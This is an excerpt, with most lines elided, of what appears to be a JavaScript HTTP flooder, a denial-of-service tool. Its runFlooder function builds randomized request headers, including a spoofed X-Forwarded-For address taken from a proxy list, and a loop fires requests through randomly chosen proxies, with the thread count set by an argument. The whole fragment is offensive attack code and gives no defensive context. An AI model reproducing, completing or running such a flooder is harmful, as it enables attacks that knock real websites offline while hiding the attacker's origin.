...
function runFlooder() {
    ...
    const rateHeaders = [
        ...
        {"source-ip": randstr(5)},
        {"data-return": "false"},
        {"X-Forwarded-For": randomElement(proxies).split(":")[0]},
        {"NEL": val},
        {"dnt": "1"},
        {"A-IM": "Feed"},
    ...
    function sendRequestThroughProxy(proxyAddr) {
    ...
    for (let i = 0; i < Math.min(proxies.length, args.threads * 2); i++) {
        sendRequestThroughProxy(randomElement(proxies));
    }
}
